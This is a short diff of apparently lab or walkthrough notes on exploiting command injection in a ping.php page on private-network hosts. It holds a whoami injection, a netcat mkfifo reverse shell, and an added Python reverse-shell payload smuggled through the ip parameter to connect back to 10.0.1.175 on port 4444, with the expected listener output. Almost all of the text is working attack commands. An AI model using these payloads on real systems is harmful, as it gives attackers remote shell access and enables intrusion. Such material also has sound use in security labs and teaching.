@@ -81,6 +81,8 @@ curl -s "http://10.0.1.23/ping.php?ip=127.0.0.1;whoami"
 
 curl "http://10.0.1.23/ping.php?ip=127.0.0.1;rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|sh+-i+2%261|nc+10.0.1.175+4444+>/tmp/f"
 
+curl "http://10.0.1.23/ping.php?ip=127.0.0.1;python3+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.1.175\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"
+
 
 ouput nya harus nya : 
 Connection received on 10.0.1.23 41650
